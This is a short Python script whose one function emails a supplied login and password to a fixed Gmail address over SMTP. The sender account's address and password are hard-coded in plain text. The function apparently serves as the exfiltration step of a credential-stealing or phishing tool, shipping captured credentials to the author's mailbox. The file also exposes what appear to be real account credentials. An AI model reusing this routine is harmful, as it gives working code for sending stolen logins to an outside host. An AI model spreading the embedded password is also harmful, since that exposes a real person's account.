import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_mail(log, passw):
    sender = 'vaha.gama@gmail.com'
    sender_pass = 'vanhan100397'
    receiver = 'vaha.gama@gmail.com'
    mail_content = log+" "+passw

    message = MIMEText(mail_content, 'plain')
    message['From'] = sender
    message['To'] = receiver
    message['Subject'] = 'test'

    session = smtplib.SMTP('smtp.gmail.com', 587)#587, 465 gmail ports
    session.starttls()
    session.login(sender, sender_pass)
    text = message.as_string()
    session.sendmail(sender, receiver, text)
    session.quit()
